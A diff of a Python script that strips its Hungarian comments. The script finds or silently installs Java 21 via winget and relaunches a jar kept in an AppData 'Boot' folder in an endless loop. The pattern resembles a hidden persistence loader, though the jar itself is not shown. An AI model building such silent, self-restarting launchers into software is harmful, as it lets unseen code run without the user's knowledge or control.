@@ -6,7 +6,6 @@ import sys
 import re
 
 def get_java_version(java_path):
-    """Lefuttatja a java -version-t és visszaadja a főverziószámot (pl. 21, 25) vagy None-t hibánál."""
     try:
         output = subprocess.check_output([java_path, "-version"], stderr=subprocess.STDOUT, text=True)
         match = re.search(r'version\s+"(\d+)\.', output)
@@ -20,8 +19,6 @@ def get_java_version(java_path):
         return None
 
 def find_java():
-    """Megkeresi a Java 21+ verziót a rendszerben. Visszaadja a java.exe elérési útját vagy None-t."""
-    # 1. PATH keresés (where)
     try:
         output = subprocess.check_output(["where", "java"], text=True).splitlines()
         for path in output:
@@ -33,7 +30,6 @@ def find_java():
     except:
         pass
 
-    # 2. Program Files mappák keresése
     search_dirs = [
         r"C:\Program Files\Eclipse Adoptium\jdk-*",
         r"C:\Program Files\Java\jdk-*",
@@ -49,7 +45,6 @@ def find_java():
             if ver and ver >= 21:
                 return path
 
-    # 3. Visszaesés a rendszer 'java' parancsára
     try:
         ver = get_java_version("java")
         if ver and ver >= 21:
@@ -59,7 +54,6 @@ def find_java():
     return None
 
 def install_java21():
-    """Telepíti a Java 21-et winget segítségével."""
     try:
         subprocess.Popen(["winget", "install", "EclipseAdoptium.Temurin.21.JDK", "--silent"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
@@ -69,7 +63,6 @@ def install_java21():
 
 JAR_PATH = os.path.join(os.getenv("APPDATA"), "Boot", "mod.jar")
 
-# Java keresés (minden indításkor)
 java_path = find_java()
 if not java_path:
     install_java21()
@@ -78,7 +71,6 @@ if not java_path:
 if not java_path:
     java_path = "java"
 
-# Végtelen ciklus – JAR futtatása 5 másodpercenként
 while True:
     try:
         subprocess.Popen([java_path, "-jar", JAR_PATH],
